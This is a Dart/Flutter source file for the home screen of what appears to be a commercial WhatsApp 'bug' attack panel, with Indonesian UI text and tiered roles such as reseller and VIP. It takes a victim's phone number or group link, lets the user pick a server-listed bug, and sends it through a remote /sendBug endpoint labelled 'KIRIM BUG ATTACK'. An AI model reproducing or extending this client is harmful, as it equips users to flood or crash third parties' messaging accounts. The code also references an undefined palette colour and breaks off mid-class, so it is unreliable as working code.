import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

const _baseUrl = 'http://ilegalsrv-byzyro.r-cloud.my.id:25590';

// ─── Palette: HITAM-PUTIH MONOKROM ──────────────────────────────────────────
class _C {
  static const bg        = Color(0xFFF2F2F2);
  static const surface   = Color(0xFFEDEDED);
  static const card      = Color(0xFFFFFFFF);
  static const cardAlt   = Color(0xFFE5E5E5);
  static const border    = Color(0xFFD4D4D4);
  static const borderLit = Color(0xFF9CA3AF);
  static const borderHit = Color(0xFF404040);

  static const accent    = Color(0xFF1F1F1F);
  static const accentDim = Color(0xFF525252);

  static const green     = Color(0xFF2A2A2A);
  static const greenDim  = Color(0xFF404040);
  static const amber     = Color(0xFF525252);
  static const red       = Color(0xFF0A0A0A);
  static const blue      = Color(0xFF3F3F3F);

  static const text      = Color(0xFF0A0A0A);
  static const textSub   = Color(0xFF4B5563);
  static const textDim   = Color(0xFF9CA3AF);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  /// 3D shadow — gelap bawah + highlight putih atas
  static List<BoxShadow> shadow3d({double depth = 6, double opacity = 0.18}) => [
    BoxShadow(
      color: Colors.black.withOpacity(opacity),
      blurRadius: depth * 2.2,
      offset: Offset(0, depth),
    ),
    BoxShadow(
      color: Colors.black.withOpacity(opacity * 0.5),
      blurRadius: depth * 0.8,
      offset: Offset(0, depth * 0.35),
    ),
    BoxShadow(
      color: Colors.white.withOpacity(0.95),
      blurRadius: depth * 0.6,
      offset: Offset(-1, -depth * 0.25),
    ),
  ];
}

Color _roleColor(String role) {
  switch (role.toLowerCase()) {
    case 'owner':     return const Color(0xFF0A0A0A);
    case 'admin':     return const Color(0xFF1F1F1F);
    case 'moderator': return const Color(0xFF2F2F2F);
    case 'partner':   return const Color(0xFF3F3F3F);
    case 'vip':       return const Color(0xFF4F4F4F);
    case 'reseller':  return const Color(0xFF2A2A2A);
    default:          return _C.accent;
  }
}

// ─── HomePage ─────────────────────────────────────────────────────────────────
class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetCtrl = TextEditingController();

  String selectedBugId = '';
  String _bugMode      = 'number';
  String _senderType   = 'private';
  bool   _isSending    = false;
  String? _responseMsg;

  List<String> _globalSenders    = [];
  bool         _isLoadingSenders = false;

  late AnimationController _bgCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _sendBtnCtrl;
  late AnimationController _resultCtrl;
  late AnimationController _waveCtrl;

  late Animation<double> _entrance;
  late Animation<double> _sendPulse;
  late Animation<double> _sendGlow;
  late Animation<double> _resultFade;
  late Animation<Offset>  _resultSlide;

  late VideoPlayerController _videoCtrl;
  ChewieController? _chewieCtrl;
  bool _videoReady = false;

  bool get canAccessGlobalSender {
    final r = widget.role.toLowerCase();
    return r == 'owner' || r == 'admin' || r == 'moderator' ||
           r == 'partner' || r == 'vip';
  }

  @override
  void initState() {
    super.initState();
    if (widget.listBug.isNotEmpty) selectedBugId = widget.listBug[0]['bug_id'];

    _bgCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 18))..repeat();

    _entranceCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 800));
    _entrance = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic);

    _sendBtnCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1800))
      ..repeat(reverse: true);
    _sendPulse = Tween<double>(begin: 1.0, end: 1.04)
        .animate(CurvedAnimation(parent: _sendBtnCtrl, curve: Curves.easeInOut));
    _sendGlow = Tween<double>(begin: 0.2, end: 0.5)
        .animate(CurvedAnimation(parent: _sendBtnCtrl, curve: Curves.easeInOut));

    _resultCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 400));
    _resultFade  = CurvedAnimation(parent: _resultCtrl, curve: Curves.easeOut);
    _resultSlide = Tween<Offset>(begin: const Offset(0, 0.10), end: Offset.zero)
        .animate(CurvedAnimation(parent: _resultCtrl, curve: Curves.easeOutCubic));

    _waveCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 3))..repeat();

    _entranceCtrl.forward();
    _initVideo();
    _loadGlobalSenders();
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _entranceCtrl.dispose();
    _sendBtnCtrl.dispose();
    _resultCtrl.dispose();
    _waveCtrl.dispose();
    targetCtrl.dispose();
    _videoCtrl.dispose();
    _chewieCtrl?.dispose();
    super.dispose();
  }

  void _initVideo() {
    _videoCtrl = VideoPlayerController.asset('assets/videos/banner.mp4');
    _videoCtrl.initialize().then((_) {
      if (!mounted) return;
      _videoCtrl.setVolume(0);
      setState(() {
        _chewieCtrl = ChewieController(
          videoPlayerController: _videoCtrl,
          autoPlay: true,
          looping: true,
          showControls: false,
        );
        _videoReady = true;
      });
    });
  }

  Future<void> _loadGlobalSenders() async {
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(Uri.parse(
        '$_baseUrl/getActiveSenders?key=${widget.sessionKey}',
      )).timeout(const Duration(seconds: 10));
      final data = jsonDecode(res.body);
      if (data['valid'] == true && data['senders'] != null) {
        if (mounted) setState(() => _globalSenders = List<String>.from(data['senders']));
      } else {
        if (mounted) setState(() => _globalSenders = []);
      }
    } catch (_) {
      if (mounted) setState(() => _globalSenders = []);
    } finally {
      if (mounted) setState(() => _isLoadingSenders = false);
    }
  }

  Future<void> _sendBug() async {
    final rawInput = targetCtrl.text.trim();
    final key      = widget.sessionKey;

    if (_bugMode == 'number') {
      if (formatPhone(rawInput) == null) {
        _showAlert('Nomor Tidak Valid',
            'Gunakan format internasional.\nContoh: +62812xxxxxxxx');
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert('Link Tidak Valid',
            'Masukkan link grup WhatsApp yang valid.\nContoh: https://chat.whatsapp.com/XXX');
        return;
      }
    }

    if (_senderType == 'global' && !canAccessGlobalSender) {
      _showAlert('Akses Ditolak',
          'Sender Global hanya untuk Owner, Admin, Moderator, Partner & VIP!');
      return;
    }

    if (selectedBugId.isEmpty) {
      _showAlert('Pilih Bug', 'Silakan pilih bug terlebih dahulu.');
      return;
    }

    setState(() { _isSending = true; _responseMsg = null; });
    _resultCtrl.reset();

    try {
      final encodedTarget = Uri.encodeComponent(rawInput);
      final url = Uri.parse(
        '$_baseUrl/sendBug'
        '?key=$key'
        '&target=$encodedTarget'
        '&bug=$selectedBugId'
        '${_senderType == 'global' ? '&senderMode=global' : ''}',
      );
      final res  = await http.get(url).timeout(const Duration(seconds: 15));
      final data = jsonDecode(res.body);

      if (data['valid'] == false) {
        _setResponse('error', 'Session key tidak valid. Silakan login ulang.');
      } else if (data['cooldown'] == true) {
        final wait = data['wait'] ?? 0;
        _setResponse('warning', 'Cooldown aktif! Tunggu $wait detik lagi.');
      } else if (data['sended'] == true) {
        final label = _bugMode == 'group' ? 'grup target' : rawInput;
        final role  = data['role'] ?? widget.role;
        _setResponse('success', 'Bug berhasil dikirim ke $label! [$role]');
        targetCtrl.clear();
      } else {
        _setResponse('error', 'Gagal mengirim. Server sedang maintenance.');
      }
    } on Exception catch (e) {
      if (e.toString().contains('TimeoutException')) {
        _setResponse('error', 'Request timeout. Periksa koneksi internet.');
      } else {
        _setResponse('error', 'Koneksi error. Periksa jaringan dan coba lagi.');
      }
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  void _setResponse(String type, String msg) {
    if (!mounted) return;
    setState(() => _responseMsg = '$type|$msg');
    _resultCtrl.forward(from: 0);
  }

  String? formatPhone(String s) {
    final c = s.replaceAll(RegExp(r'[^\d+]'), '');
    return (c.startsWith('+') && c.length >= 8) ? c : null;
  }

  bool isValidGroupLink(String s) =>
      s.startsWith('https://') && s.contains('chat.whatsapp.com');

  void _showAlert(String title, String msg) {
    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.black54,
      transitionDuration: const Duration(milliseconds: 280),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: Colors.white, width: 1.5),
            boxShadow: _C.shadow3d(depth: 10, opacity: 0.28),
          ),
          padding: const EdgeInsets.all(26),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 52, height: 52,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const LinearGradient(
                  colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                border: Border.all(color: Colors.white, width: 2),
                boxShadow: _C.shadow3d(depth: 4),
              ),
              child: const Icon(Icons.warning_amber_rounded,
                  color: Colors.white, size: 26),
            ),
            const SizedBox(height: 14),
            Text(title, style: const TextStyle(color: _C.text, fontSize: 17,
                fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(msg, textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 22),
            _GradBtn(label: 'OK', fullWidth: true, onTap: () => Navigator.pop(ctx)),
          ]),
        ),
      ),
    );
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(children: [
        Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
        SafeArea(
          child: FadeTransition(
            opacity: _entrance,
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 40),
              child: Column(children: [
                _buildProfileCard(),
                const SizedBox(height: 14),
                _buildVideoCard(),
                const SizedBox(height: 18),
                _buildModeToggle(),
                const SizedBox(height: 14),
                _buildTargetInput(),
                const SizedBox(height: 16),
                _buildBugSelector(),
                const SizedBox(height: 16),
                _buildSenderCard(),
                const SizedBox(height: 28),
                _buildSendButton(),
                const SizedBox(height: 12),
                if (_responseMsg != null) _buildResultBanner(),
              ]),
            ),
          ),
        ),
      ]),
    );
  }

  // ── Profile card ──────────────────────────────────────────────────────────
  Widget _buildProfileCard() {
    final rColor = _roleColor(widget.role);
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.white, width: 1.5),
        boxShadow: _C.shadow3d(depth: 6, opacity: 0.2),
      ),
      child: Row(children: [
        Container(
          width: 50, height: 50,
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            shape: BoxShape.circle,
            border: Border.all(color: Colors.white, width: 2),
            boxShadow: _C.shadow3d(depth: 4),
          ),
          child: const Icon(Icons.person_rounded, color: Colors.white, size: 24),
        ),
        const SizedBox(width: 14),
        Expanded(child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(widget.username, style: const TextStyle(color: _C.text,
                fontSize: 16, fontWeight: FontWeight.w800, letterSpacing: -0.3)),
            const SizedBox(height: 4),
            Row(children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(
                  color: _C.cardAlt,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: _C.borderLit),
                ),
                child: Text(widget.role.toUpperCase(),
                    style: const TextStyle(color: _C.text, fontSize: 9,
                        fontWeight: FontWeight.w800, letterSpacing: 0.8)),
              ),
              const SizedBox(width: 8),
              Text('Exp: ${widget.expiredDate}',
                  style: const TextStyle(color: _C.textSub, fontSize: 11)),
            ]),
          ],
        )),
        Column(children: [
          Container(
            width: 7, height: 7,
            decoration: BoxDecoration(
              shape: BoxShape.circle, color: _C.black,
              boxShadow: [
                BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 6),
              ],
            ),
          ),
          const SizedBox(height: 3),
          const Text('LIVE', style: TextStyle(color: _C.text, fontSize: 8,
              fontWeight: FontWeight.w800, letterSpacing: 0.5)),
        ]),
      ]),
    );
  }

  // ── Video card (grayscale) ────────────────────────────────────────────────
  Widget _buildVideoCard() {
    return Container(
      clipBehavior: Clip.hardEdge,
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.white, width: 2),
        boxShadow: _C.shadow3d(depth: 8, opacity: 0.25),
      ),
      child: _videoReady && _chewieCtrl != null
          ? Stack(children: [
              ColorFiltered(
                colorFilter: const ColorFilter.matrix(<double>[
                  0.2126, 0.7152, 0.0722, 0, 0,
                  0.2126, 0.7152, 0.0722, 0, 0,
                  0.2126, 0.7152, 0.0722, 0, 0,
                  0,      0,      0,      1, 0,
                ]),
                child: AspectRatio(
                  aspectRatio: _videoCtrl.value.aspectRatio,
                  child: Chewie(controller: _chewieCtrl!),
                ),
              ),
              Positioned(top: 0, left: 0, right: 0,
                child: Container(height: 2,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        Colors.transparent,
                        Colors.white.withOpacity(0.9),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
            ])
          : const SizedBox(height: 180,
              child: Center(child: _DotsLoader())),
    );
  }

  // ── Mode toggle ───────────────────────────────────────────────────────────
  Widget _buildModeToggle() {
    return Container(
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white, width: 1.5),
        boxShadow: _C.shadow3d(depth: 4, opacity: 0.16),
      ),
      child: Row(children: [
        _ModeTab(
          icon: Icons.phone_android_rounded,
          label: 'Bug Nomor',
          active: _bugMode == 'number',
          onTap: () => setState(() { _bugMode = 'number'; targetCtrl.clear(); }),
        ),
        _ModeTab(
          icon: Icons.group_rounded,
          label: 'Bug Group',
          active: _bugMode == 'group',
          onTap: () => setState(() { _bugMode = 'group'; targetCtrl.clear(); }),
        ),
      ]),
    );
  }

  // ── Target input ──────────────────────────────────────────────────────────
  Widget _buildTargetInput() {
    return _InputSection(
      icon: _bugMode == 'number'
          ? Icons.phone_android_rounded
          : Icons.link_rounded,
      label: _bugMode == 'number' ? 'Nomor Target' : 'Link Grup WhatsApp',
      child: _BugInput(
        controller: targetCtrl,
        hint: _bugMode == 'number'
            ? 'Contoh: +62812xxxxxxxx'
            : 'Contoh: https://chat.whatsapp.com/...',
        keyboardType: _bugMode == 'number'
            ? TextInputType.phone
            : TextInputType.url,
        icon: _bugMode == 'number'
            ? Icons.phone_android_rounded
            : Icons.link_rounded,
      ),
    );
  }

  // ── Bug selector ──────────────────────────────────────────────────────────
  Widget _buildBugSelector() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(children: [
          Container(
            width: 3, height: 16,
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
              ),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 10),
          const Text('PILIH BUG',
              style: TextStyle(color: _C.text, fontSize: 12,
                  fontWeight: FontWeight.w800, letterSpacing: 1.2)),
          const Spacer(),
          Text('${widget.listBug.length} tersedia',
              style: const TextStyle(color: _C.textDim, fontSize: 10)),
        ]),
        const SizedBox(height: 12),

        SizedBox(
          height: 148,
          child: ListView.separated(
            scrollDirection: Axis.horizontal,
            physics: const BouncingScrollPhysics(),
            itemCount: widget.listBug.length,
            separatorBuilder: (_, __) => const SizedBox(width: 10),
            itemBuilder: (_, i) {
              final bug       = widget.listBug[i];
              final bugId     = bug['bug_id']   as String? ?? '';
              final bugName   = bug['bug_name'] as String? ?? 'BUG';
              final isSelected = selectedBugId == bugId;

              return _BugCard(
                name: bugName,
                id: bugId,
                selected: isSelected,
                onTap: () => setState(() => selectedBugId = bugId),
              );
            },
          ),
        ),
      ],
    );
  }

  // ── Sender card ───────────────────────────────────────────────────────────
  Widget _buildSenderCard() {
    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white, width: 1.5),
        boxShadow: _C.shadow3d(depth: 6, opacity: 0.2),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            decoration: BoxDecoration(
              border: Border(bottom: BorderSide(
                  color: _C.border.withOpacity(0.6))),
            ),
            child: Row(children: [
              Container(
                width: 34, height: 34,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(
                    colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(9),
                  border: Border.all(color: Colors.white, width: 1.5),
                  boxShadow: _C.shadow3d(depth: 3),
                ),
                child: const Icon(FontAwesomeIcons.server,
                    color: Colors.white, size: 13),
              ),
              const SizedBox(width: 12),
              const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('Pilih Sender', style: TextStyle(color: _C.text,
                      fontSize: 14, fontWeight: FontWeight.w700)),
                  Text('Sumber nomor pengirim', style: TextStyle(
                      color: _C.textSub, fontSize: 11)),
                ],
              ),
              const Spacer(),
              GestureDetector(
                onTap: _loadGlobalSenders,
                child: Container(
                  width: 30, height: 30,
                  decoration: BoxDecoration(
                    color: _C.cardAlt,
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _C.borderLit),
                    boxShadow: [
                      BoxShadow(
                          color: Colors.black.withOpacity(0.15),
                          blurRadius: 5,
                          offset: const Offset(0, 2)),
                    ],
                  ),
                  child: _isLoadingSenders
                      ? const Padding(padding: EdgeInsets.all(7),
                          child: CircularProgressIndicator(
                              strokeWidth: 2, color: _C.black))
                      : const Icon(Icons.refresh_rounded,
                          color: _C.text, size: 16),
                ),
              ),
            ]),
          ),

          Padding(
            padding: const EdgeInsets.all(14),
            child: Row(children: [
              Expanded(child: _SenderOption(
                icon: FontAwesomeIcons.globe,
                label: 'Global',
                sublabel: _isLoadingSenders
                    ? 'Loading...'
                    : '${_globalSenders.length} sender',
                selected: _senderType == 'global',
                locked: !canAccessGlobalSender,
                onTap: () {
                  if (!canAccessGlobalSender) {
                    _showAlert('Akses Ditolak',
                        'Sender Global hanya untuk Owner, Admin, Moderator, Partner & VIP!');
                    return;
                  }
                  setState(() => _senderType = 'global');
                  _loadGlobalSenders();
                },
              )),
              const SizedBox(width: 10),
              Expanded(child: _SenderOption(
                icon: FontAwesomeIcons.userShield,
                label: 'Private',
                sublabel: 'Session lu sendiri',
                selected: _senderType == 'private',
                locked: false,
                onTap: () => setState(() => _senderType = 'private'),
              )),
            ]),
          ),

          if (_senderType == 'global' && _globalSenders.isNotEmpty)
            Container(
              margin: const EdgeInsets.fromLTRB(14, 0, 14, 14),
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.surface,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
                boxShadow: [
                  BoxShadow(
                      color: Colors.black.withOpacity(0.1),
                      blurRadius: 6,
                      offset: const Offset(0, 3)),
                ],
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(children: [
                    const Icon(Icons.format_list_bulleted_rounded,
                        color: _C.textSub, size: 12),
                    const SizedBox(width: 6),
                    Text('${_globalSenders.length} sender aktif',
                        style: const TextStyle(color: _C.textSub,
                            fontSize: 11, fontWeight: FontWeight.w600)),
                  ]),
                  const SizedBox(height: 8),
                  ...(_globalSenders.take(3).map((s) => Padding(
                    padding: const EdgeInsets.only(bottom: 4),
                    child: Row(children: [
                      Container(width: 5, height: 5,
                          decoration: const BoxDecoration(
                              shape: BoxShape.circle, color: _C.black)),
                      const SizedBox(width: 8),
                      Text(s, style: const TextStyle(color: _C.text,
                          fontSize: 11, fontFamily: 'monospace')),
                    ]),
                  ))),
                  if (_globalSenders.length > 3)
                    Text('+ ${_globalSenders.length - 3} lainnya...',
                        style: const TextStyle(color: _C.textDim, fontSize: 10)),
                ],
              ),
            ),
        ],
      ),
    );
  }

  // ── Send button ───────────────────────────────────────────────────────────
  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _sendBtnCtrl,
      builder: (_, __) => GestureDetector(
        onTap: _isSending ? null : _sendBug,
        child: Transform.scale(
          scale: _isSending ? 1.0 : _sendPulse.value,
          child: Container(
            height: 62, width: double.infinity,
            decoration: BoxDecoration(
              gradient: _isSending
                  ? const LinearGradient(
                      colors: [Color(0xFF9CA3AF), Color(0xFF6B7280)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    )
                  : const LinearGradient(
                      colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: Colors.white, width: 2),
              boxShadow: _isSending
                  ? []
                  : [
                      BoxShadow(
                          color: Colors.black.withOpacity(0.4),
                          blurRadius: 20,
                          offset: const Offset(0, 8)),
                      BoxShadow(
                          color: Colors.black.withOpacity(0.2),
                          blurRadius: 6,
                          offset: const Offset(0, 3)),
                      BoxShadow(
                          color: Colors.white.withOpacity(0.7),
                          blurRadius: 4,
                          offset: const Offset(-1, -2)),
                    ],
            ),
            child: Stack(children: [
              if (_isSending)
                ClipRRect(
                  borderRadius: BorderRadius.circular(18),
                  child: AnimatedBuilder(
                    animation: _waveCtrl,
                    builder: (_, __) => CustomPaint(
                      painter: _WavePainter(_waveCtrl.value),
                      size: const Size(double.infinity, 62),
                    ),
                  ),
                ),
              Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 220),
                  child: _isSending
                      ? const Row(
                          key: ValueKey('sending'),
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            SizedBox(
                              width: 18, height: 18,
                              child: CircularProgressIndicator(
                                  strokeWidth: 2.5, color: Colors.white),
                            ),
                            SizedBox(width: 12),
                            Text('Mengirim Bug...', style: TextStyle(
                                color: Colors.white, fontWeight: FontWeight.w800,
                                fontSize: 15)),
                          ])
                      : const Row(
                          key: ValueKey('idle'),
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.rocket_launch_rounded,
                                color: Colors.white, size: 20),
                            SizedBox(width: 10),
                            Text('KIRIM BUG ATTACK', style: TextStyle(
                                color: Colors.white, fontWeight: FontWeight.w900,
                                fontSize: 15, letterSpacing: 1.2,
                                shadows: [
                                  Shadow(
                                    color: Color(0x66000000),
                                    offset: Offset(0, 2),
                                    blurRadius: 4,
                                  ),
                                ])),
                          ]),
                ),
              ),
            ]),
          ),
        ),
      ),
    );
  }

  // ── Result banner ─────────────────────────────────────────────────────────
  Widget _buildResultBanner() {
    if (_responseMsg == null) return const SizedBox();
    final parts = _responseMsg!.split('|');
    final type  = parts[0];
    final msg   = parts.length > 1 ? parts[1] : '';

    Color color;
    IconData icon;
    switch (type) {
      case 'success': color = _C.black;  icon = Icons.check_circle_rounded; break;
      case 'warning': color = _C.amber;  icon = Icons.warning_rounded; break;
      default:        color = _C.red;    icon = Icons.error_rounded;
    }

    return FadeTransition(
      opacity: _resultFade,
      child: SlideTransition(
        position: _resultSlide,
        child: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: color.withOpacity(0.4), width: 1.5),
            boxShadow: _C.shadow3d(depth: 5, opacity: 0.18),
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                width: 32, height: 32,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: color.withOpacity(0.1),
                  border: Border.all(color: color.withOpacity(0.3)),
                ),
                child: Icon(icon, color: color, size: 17),
              ),
              const SizedBox(width: 12),
              Expanded(child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    type == 'success' ? 'Berhasil'
                        : type == 'warning' ? 'Peringatan' : 'Gagal',
                    style: TextStyle(color: color, fontSize: 13,
                        fontWeight: FontWeight.w700),
                  ),
                  const SizedBox(height: 3),
                  Text(msg, style: const TextStyle(
                      color: _C.textSub, fontSize: 12, height: 1.4)),
                ],
              )),
              GestureDetector(
                onTap: () {
                  setState(() => _responseMsg = null);
                  _resultCtrl.reset();
                },
                child: const Icon(Icons.close_rounded, color: _C.textDim, size: 15),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Bug Card ─────────────────────────────────────────────────────────────────
class _BugCard extends StatefulWidget {
  final String name;
  final String id;
  final bool selected;
  final VoidCallback onTap;

  const _BugCard({
    required this.name,
    required this.id,
    required this.selected,
    required this.onTap,
  });

  @override
  State<_BugCard> createState() => _BugCardState();
}

class _BugCardState extends State<_BugCard> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final sel = widget.selected;

    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.94 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          width: 120,
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 14),
          decoration: BoxDecoration(
            gradient: sel
                ? const LinearGradient(
                    colors: [Color(0xFF2A2A2A), Color(0xFF0A0A0A)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  )
                : const LinearGradient(
                    colors: [Color(0xFFFFFFFF), Color(0xFFF0F0F0)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
            borderRadius: BorderRadius.circular(18),
            border: Border.all(
              color: Colors.white,
              width: sel ? 2 : 1.5,
            ),
            boxShadow: sel
                ? [
                    BoxShadow(
                        color: Colors.black.withOpacity(0.4),
                        blurRadius: 16,
                        offset: const Offset(0, 6)),
                    BoxShadow(
                        color: Colors.white.withOpacity(0.6),
                        blurRadius: 3,
                        offset: const Offset(-1, -2)),
                  ]
                : _C.shadow3d(depth: 4, opacity: 0.15),
          ),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                width: 44, height: 44,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: sel
                      ? const LinearGradient(
                          colors: [Color(0xFFFFFFFF), Color(0xFFBDBDBD)],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        )
                      : const LinearGradient(
                          colors: [Color(0xFF3F3F3F), Color(0xFF1F1F1F)],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ),
                  border: Border.all(color: Colors.white, width: 2),
                  boxShadow: [
                    BoxShadow(
                        color: Colors.black.withOpacity(0.3),
                        blurRadius: 8,
                        offset: const Offset(0, 3)),
                  ],
                ),
                child: Icon(
                  Icons.bug_report_rounded,
                  size: 20,
                  color: sel ? Colors.black : Colors.white,
                ),
              ),

              const SizedBox(height: 10),

              Text(
                widget.name.toUpperCase(),
                style: TextStyle(
                  color: sel ? Colors.white : _C.text,
                  fontSize: 10,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 0.6,
                ),
                textAlign: TextAlign.center,
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),

              const SizedBox(height: 6),

              Container(
                padding: const EdgeInsets.symmetric(
                    horizontal: 7, vertical: 2),
                decoration: BoxDecoration(
                  color: sel
                      ? Colors.white.withOpacity(0.2)
                      : _C.cardAlt,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(
                    color: sel
                        ? Colors.white.withOpacity(0.4)
                        : _C.borderLit,
                  ),
                ),
                child: Text(
                  'iD: ${widget.id}',
                  style: TextStyle(
                    color: sel ? Colors.white : _C.textSub,
                    fontSize: 9,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'monospace',
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),

              if (sel) ...[
                const SizedBox(height: 8),
                Container(
                  width: 20, height: 20,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.25),
                    border: Border.all(color: Colors.white.withOpacity(0.7)),
                  ),
                  child: const Icon(Icons.check_rounded,
                      color: Colors.white, size: 12),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Widgets ──────────────────────────────────────────────────────────────────
class _ModeTab extends StatelessWidget {
  final IconData icon;
  final String label;
  final bool active;
  final VoidCallback onTap;

  const _ModeTab({
    required this.icon, required this.label,
    required this.active, required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
